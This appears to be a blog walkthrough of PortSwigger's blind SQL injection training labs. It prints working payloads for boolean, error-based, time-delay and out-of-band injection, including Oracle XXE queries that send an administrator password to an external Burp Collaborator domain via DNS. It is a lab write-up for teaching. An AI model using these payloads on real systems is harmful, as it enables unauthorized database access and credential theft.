---
layout: post
title:  "Blind SQL injection – Portswigger Walkthroughs"
date:   2022-11-14 09:00:21 +0200
author: Clara Hällgren
---
In the previous articles on SQL injection (SQLi) we have seen the database output in the HTTP responses. A blind SQLi vulnerability
does not respond with directly viewable data as a table name or its content. It is still possible to exploit these vulnerabilities 
if you use other, a bit more sophisticated, techniques like triggering conditional responses or SQL errors. In this article I will 
continue to do walkthroughs of Portswiggers Labs, and this time, they are all about blind vulnerabilities.

## LAB: Blind SQL injection with conditional responses 

This lab contains a blind SQLi vulnerability in its Tracking cookie that if recognized will display a "Welcome Back" message
on the page. We know that the database contains a table named users with the columns username and password. To solve the lab we need to log in 
as the administrator. 

Step 1: I click the home page and notice the "welcome back" message on the page. I open the request in burp suite and start to play around with it.
To prove its vulnerable I add an always-false condition to the tracking cookie ('AND 1=2--). Perfect, the "Welcome Back" message is no longer there.

Step 2: As I already have the table, column and users names I need to one by one test each letter in the administrators' password. When I see 
the Welcome back message I know I have the right character for that specific position in the password. This is done by querying a substring 
of the password, just one letter, and comparing it to a letter of my choice. 

    'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) = 'a--

To test this out, the probability that the first letter in the password is 'a' is quite small. And yes, the Welcome back message is 
no longer visible. Although, the probability that the first letter is bigger than 'a' is quite large which is true as the following query 
displays the welcome back message. So, if the query is true the welcome back message will show, if not it disappears. 

    'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1)>'a--

I could do this manually for every letter and number in the password. But I don't want to. So I will use Burp Intruder for this task.
Here I can go letter by letter and Grep the Welcome Back message which shows each letter on each position. Eventually I get the password and 
the lab is solved. 

## LAB: Blind SQL injection with conditional errors

In the previous example we could exploit the SQLi vulnerability with one kind of visual boolean response on the webpage. Sometimes we can't. 
That does not always mean we cannot exploit the vulnerability. In this lab we will make the database generate an error when
the statement is true, and not when it's false. This is possible if the error thrown in unhandled in the backend code as it then (hopefully)
will cause some difference in the application response which allows us to infer the truth of the injected condition. 

Look at these for example: 

(SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a -> Will result in 'a' and not generate an error.
(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) = 'a -> Will result in a divide by 0 error as the expression is true.

So we can systematically retrieve data one char at a time by modifying this condition. If we see an error message, we know
we got it right. 

    'AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password,1,1) = 'm') THEN 1/0 ELSE 'a' END FROM users) ='a

What this query says is that if username is administrator and the first letter of the password is m then divide 1/0 and
cause an error. If not, the value of the parenthesis is 'a' which will be compared with 'a', aka always true and never cause
an error. 

Step 1: I first like to confirm the vulnerability by requesting simple queries that I know are true or false to see the 
behaviour. Therefore, I start with the first to examples which generates 500 error in both cases. This is not expected and will not work, so I view the 
cheat sheet for how to do the same thing on different database types. I find that it probably is an Oracle database as 
this gives me the expected result: Http ok when the condition is false and 500 server error when true.

    'AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a--
    'AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a--

Step 2: Now I want to make sure my query is correct before I send it to Intruder. This is how my working query looks: 

    AND (SELECT CASE WHEN SUBSTR(password,1,1)<'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a--

Step 3: Send the working request to intruder and press clear. Change the < to = and add the first number in SUBSTR and 'a' as a parameter. This time
I will use a more advanced way of working with the intruder than the last lab (Note, there is an even better way but let's keep it kinda simple). Choose Cluster bomb as attack type and go to payloads. Set payload set to 1 and add the numbers 1-25 to begin with.
Set payload set to 2 and add 0-9, a-z, and A-Z. Now we can start the attack. 
Sort the result on status with 500 at the top and there is your password with position as Payload 1 and letter/number as payload 2. 

## LAB: Blind SQL injection with time delays

Okay cool. But can we exploit Blind SQLi vulnerabilities if we don't see anything in the response? No "Welcome back" message or
error message is delivered to the application? Well, yes! or at least sometimes. In this situation it is sometimes possible to 
exploit this by triggering time delays on if a condition is true or not. This is only possible if SQL queries are handled synchronously, which
they generally are, as delaying the execution of a SQL query will delay the HTTP response. This basically means, that we can trigger a time delay
if a condition is true and thereby, systematically retrieve data letter by letter. 

In this lab, the objective is to cause a 10-second time delay using the tracking cookie's vulnerability. Time delays are highly dependent on 
what kind of database we are dealing with, so the cheat sheet is a great asset. 

Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)

The third option seems to be correct and when I use the query below, I get a 10-second time delay.

    '||pg_sleep(10)--

## LAB: Blind SQL injection with time delays and information retrieval

Step 1: I run the same command as the result was in the previous lab just to make sure we are still dealing with a 
PostgreSQL database. Below is the format for conditional time delays on PostgreSQL.

    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

Adding simple conditions like 1=1 confirms that this works fine. Then I try to use my command from earlier which does not work
so I read some documentation and change it accordingly. The below query works. Note that the ';' is needed at the beginning. This
marks that the queries should be handled separately. 

    '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'a') THEN pg_sleep(10) ELSE pg_sleep(10) END FROM users--

Use intruder to automate the work of finding out the password. This is done just like previous examples but with one exception. For the process of 
to be as reliable as possible you should only send one request at a time, configure this under resource pool. To view the time it takes for 
each request, go to columns menu in the attack-popup and check in the box Response received. 

## LAB: Blind SQL injection with out-of-band interaction

If the database queries run asynchronously then? Yes, it is still possible to exploit. This is even a preferred method for many 
when dealing with Blind SQLi as data can be exfiltrated directly within the network interaction itself. In this lab the Tracking cookie is
vulnerable but none of the methods in previous labs will do the trick. If we view the cheat sheet there are different ways of exploiting this 
depending on the type of database, I start by trying with the first one which is Oracle. The documentation says: 

    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

And I modify it to fit my needs and add my generated Burp Collaborator address:

    'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ig24849hofldo23mg48f7njde4kv8lwa.oastify.com/"> %remote;]>'),'/l') FROM dual

This is enough to cause a DNS query which it solves the lab. Note that we did not add any query to this as it was not the lab objective.

## LAB: Blind SQL injection with out-of-band data exfiltration

This is the same thing as the previous lab except that we should get the administrator password as well. Looking at the 
SQLi cheat sheets note on out of band interaction on Oracle again:

    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

Then we modify it to fit our needs: 

    'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.q90c1c2phnelhawu9c1n0vcl7cd31upj.oastify.com/"> %remote;]>'),'/l') FROM dual

Before the domain name in the DNS lookups in burp collaborator we see the password. Log in as administrator and the lab is solved. 

